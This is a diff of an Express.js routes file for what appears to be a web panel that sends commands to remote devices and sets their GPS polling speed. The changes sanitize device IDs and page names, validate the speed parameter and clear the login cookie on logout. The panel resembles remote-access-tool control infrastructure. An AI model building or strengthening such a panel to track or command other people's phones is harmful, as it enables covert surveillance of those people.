@@ -78,7 +78,7 @@ routes.post('/login', (req, res) => {
 
 routes.get('/logout', isAllowed, (req, res) => {
     db.maindb.get('admin').assign({ loginToken: '' }).write();
-    res.redirect('/');
+    res.clearCookie('loginToken').redirect('/');
 });
 
 
@@ -123,30 +123,41 @@ routes.get('/logs', isAllowed, (req, res) => {
 
 
 routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
-    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
+    // Sanitize inputs
+    const deviceID = req.params.deviceid.replace(/[^a-zA-Z0-9_-]/g, '');
+    const page = req.params.page.replace(/[^a-zA-Z]/g, '');
+
+    let pageData = clientManager.getClientDataByPage(deviceID, page, req.query.filter);
     if (pageData) res.render('deviceManager', {
-        page: req.params.page,
-        deviceID: req.params.deviceid,
-        baseURL: '/manage/' + req.params.deviceid,
+        page: page,
+        deviceID: deviceID,
+        baseURL: '/manage/' + deviceID,
         pageData
     });
     else res.render('deviceManager', {
         page: 'notFound',
-        deviceID: req.params.deviceid,
-        baseURL: '/manage/' + req.params.deviceid
+        deviceID: deviceID,
+        baseURL: '/manage/' + deviceID
     });
 });
 
 routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
+    // Sanitize deviceid
+    const deviceID = req.params.deviceid.replace(/[^a-zA-Z0-9_-]/g, '');
+    
     // Patch 12: Use req.body for command payloads
-    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.body, (error, message) => {
+    clientManager.sendCommand(deviceID, req.params.commandID, req.body, (error, message) => {
         if (!error) res.json({ error: false, message })
         else res.json({ error })
     });
 });
 
 routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
-    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
+    const deviceID = req.params.deviceid.replace(/[^a-zA-Z0-9_-]/g, '');
+    const speed = parseInt(req.params.speed);
+    if (isNaN(speed)) return res.json({ error: 'Invalid Speed' });
+
+    clientManager.setGpsPollSpeed(deviceID, speed, (error) => {
         if (!error) res.json({ error: false })
         else res.json({ error })
     });
